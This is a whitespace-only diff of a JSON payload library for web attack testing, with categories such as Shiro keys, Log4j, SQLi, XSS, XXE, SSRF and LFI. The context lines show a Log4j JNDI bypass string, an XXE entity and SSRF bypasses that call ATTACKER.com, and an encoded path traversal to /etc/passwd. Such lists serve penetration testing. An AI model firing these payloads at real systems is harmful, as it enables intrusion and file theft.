@@ -5,7 +5,7 @@
     "total_payloads": "500+",
     "sources": ["PayloadsAllTheThings", "SecLists", "FuzzDB", "实战案例"]
   },
-  
+
   "shiro": {
     "description": "Shiro反序列化密钥库",
     "count": 51,
@@ -18,7 +18,7 @@
       "注: 完整51个密钥已内置于 mega_payload_library.py"
     ]
   },
-  
+
   "log4j": {
     "description": "Log4j RCE Payload变种",
     "count": 35,
@@ -29,7 +29,7 @@
       "env_bypass": ["${${env:NaN:-j}ndi:ldap://D/a}"]
     }
   },
-  
+
   "sqli": {
     "description": "SQL注入完整Payload库",
     "count": 100,
@@ -60,7 +60,7 @@
       ]
     }
   },
-  
+
   "xss": {
     "description": "XSS跨站脚本完整库",
     "count": 80,
@@ -90,7 +90,7 @@
       ]
     }
   },
-  
+
   "rce": {
     "description": "命令注入/RCE完整库",
     "count": 60,
@@ -107,7 +107,7 @@
       ]
     }
   },
-  
+
   "file_upload": {
     "description": "文件上传绕过完整库",
     "count": 50,
@@ -122,7 +122,7 @@
       "mime_types": ["image/jpeg", "image/png", "application/octet-stream"]
     }
   },
-  
+
   "xxe": {
     "description": "XXE外部实体注入",
     "count": 15,
@@ -131,7 +131,7 @@
       "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://ATTACKER.com\">]><foo>&xxe;</foo>"
     ]
   },
-  
+
   "ssrf": {
     "description": "SSRF服务端请求伪造",
     "count": 30,
@@ -142,7 +142,7 @@
       "bypass": ["http://127.0.0.1@ATTACKER.com", "http://127.1"]
     }
   },
-  
+
   "lfi": {
     "description": "目录遍历/LFI",
     "count": 25,
@@ -153,7 +153,7 @@
       "encoded": ["..%2F..%2F..%2Fetc%2Fpasswd"]
     }
   },
-  
+
   "deserialization": {
     "description": "反序列化漏洞",
     "frameworks": {
@@ -163,7 +163,7 @@
       "dotnet": ["BinaryFormatter", "ObjectStateFormatter"]
     }
   },
-  
+
   "template_injection": {
     "description": "模板注入SSTI",
     "count": 40,
